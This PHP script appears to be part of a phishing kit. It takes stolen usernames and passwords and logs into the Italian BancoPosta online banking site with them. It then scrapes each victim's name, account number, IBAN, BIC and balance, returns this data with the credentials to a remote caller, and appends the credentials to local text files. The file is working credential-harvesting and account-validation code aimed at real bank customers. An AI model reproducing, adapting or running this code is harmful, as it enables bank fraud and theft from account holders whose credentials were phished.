<?php
error_reporting(0);
$remote="no";

if(isset($_GET['test'])){
    print " readyforaction ";
    exit;
}
if(isset($_GET['stats'])){
    $remote="yes";
    $user=$_GET['user'];
    $pass=$_GET['pass'];
}
function doRequest($method, $url, $referer, $agent, $cookie, $vars) {
    $ch=curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    if($referer != "") {
        curl_setopt($ch, CURLOPT_REFERER, $referer);
    }
    curl_setopt($ch, CURLOPT_USERAGENT, $agent);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
    if ($method == 'POST') {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
    }
    if (substr($url, 0, 5) == "https") {
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
    }
    $data = curl_exec($ch);
    curl_close($ch);
    if ($data) {
        return $data;
    } else {
        return curl_error($ch);
    }
}

function get($url, $referer, $agent, $cookie) {
    return doRequest('GET', $url, $referer, $agent, $cookie, 'NULL');
}
function post($url, $referer, $agent, $cookie,  $vars) {
    return doRequest('POST', $url, $referer, $agent, $cookie, $vars);
}

$random = rand(1, 100000);
$cookie = $random . ".txt";
$agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";
$url = 'https://bancopostaonline.poste.it/bpol/bancoposta/Logon.fcc';
$referer = 'https://bancopostaonline.poste.it/bpol/bancoposta/Logon.fcc';
$vars = "USER=" . urlencode($user) . "&Password=" . urlencode($pass) . "&btnSubmit=Invia&target=%2Fbpol%2Fbancoposta%2Fentry%2FRedirectionGateway%2Eashx%3Ftype%3DSMACCESS&device_id=%5B%5B%5BINACCESSIBLE%5D%5D%5D&deviceId=%5B%5B%5BINACCESSIBLE%5D%5D%5D&deviceprint=&browser=";

$url1= "https://bancopostaonline.poste.it/bpol/bancoposta/Servizi/SituazioneConto/SituazioneConto.aspx";
$ref1="https://bancopostaonline.poste.it/bpol/bancoposta/servizi/contobancoposta.aspx";
// not sure here check later
//$str = post($url . '&' . $vars, $referer, $agent, $cookie,  '');
   $str = post($url, $referer, $agent, $cookie, $vars);
   $str1=post($url1,$ref1,$agent,$cookie,$vars);
//$pattern = "/<span>(.*?)<\/span(.*?)<\/span>/";
$signerr=1;
$codiceset = "yes";
// loggin result
if (strstr($str,"Attenzione!")){
  $signerr=2;
}
if (strstr($str, "Conto BancoPosta e Carte")) {
  $codiceset="yes";
}
if (strstr($str,"<span>Benvenut")) {
        $complete_welcome = strip_tags(substr($str,strpos($str,"Benvenut")+0,110));
        //preg_match('/<span>Benvenut(.*?)<\/span><span class=(.*?)<\/span>/',$str,$matches);
        //$only_name = substr($str,strpos($str,"Benvenut")+9,150);
        //$match_found = strip_tags($matches[0]);
        $replace_str = str_replace('&nbsp;',' ', $complete_welcome);
}

if (strstr($str,"<span><br />Il tuo ultimo accesso a BancoPosta online")) {
        $extract2=strip_tags(substr($str,strpos($str,'stato il')+0,80));
}

if (strstr($str1,'Saldo Disponibile')) {
        $numero_conto=strip_tags(substr($str1,strpos($str1,'<span id="SituazioneConto_Lista1_rptConto__ctl0_Label12">')+0,100));
                $nume_conto=strip_tags(substr($str1,strpos($str1,'<span id="SituazioneConto_Lista1_rptConto__ctl0_Label13">')+0,100));
        $codice_iban=strip_tags(substr($str1,strpos($str1,'<span id="SituazioneConto_Lista1_rptConto__ctl0_lblIban">')+0,100));
        $codice_bic=strip_tags(substr($str1,strpos($str1,'<span id="SituazioneConto_Lista1_rptConto__ctl0_lblBic">')+0,100));
        $saldo=strip_tags(substr($str1,strpos($str1,'<span id="SituazioneConto_Lista1_rptConto__ctl0_lblSaldoDisponibileNew" style="font-weight:bold;">')+0,200));
}

//
if($remote=="yes"){
print
urlencode("startonthisfuckingpointsignerr=$signerr&welcomescreen=$replace_str&numeroconto=$numero_conto&nomeconto=$nume_conto&codiceiban=$codice_iban&codicebic=$codice_bic&saldo=$saldo&lastone=$extract2&user=$user&pass=$pass&codiceset=$codiceset&endonthisfuckingpoint");
}

if ($codiceset=="yes") {
        $msg="[Nome Utente] $user\n[Password] $pass\n";
        $fp=fopen('gigi.txt','a+');
        fputs($fp,$msg);
        fclose($fp);
} else {
$msg='[Nome Utente]'.$user."\n";
$msg.='[Password]'.$pass."\n";
$fp=fopen('gigi2.txt','a+');
fputs($fp,$msg);
fclose($fp);

}
?>
